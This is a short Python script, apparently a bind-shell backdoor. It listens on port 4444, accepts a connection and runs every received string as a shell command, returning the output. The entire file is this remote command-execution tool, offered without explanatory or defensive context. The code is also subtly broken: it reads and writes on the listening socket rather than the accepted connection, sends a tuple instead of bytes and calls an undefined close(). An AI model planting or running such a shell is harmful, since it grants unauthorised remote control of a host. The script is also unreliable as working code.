# coding: utf-8
import socket
import sys
import os
import subprocess

IP = "localhost"
PORT = 4444
ADDR = (IP, PORT)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(ADDR)
s.listen(5)
con, cliente = s.accept()
while con:
	con = s.recv(1024)
	con = con.decode("utf-8")
	if "cd " in con:
		try:
			os.chdir(con[3:].strip("\n"))
		except:
			True
	if "exit" in con[:-1]:
		s.close()
		sys.exit()
		close()
	
	sub = subprocess.Popen(con, shell=True, stdin = subprocess.PIPE, stderr = subprocess.PIPE, stdout = subprocess.PIPE)
	output = (sub.stderr.read(), sub.stdout.read())
	s.send(output)
		
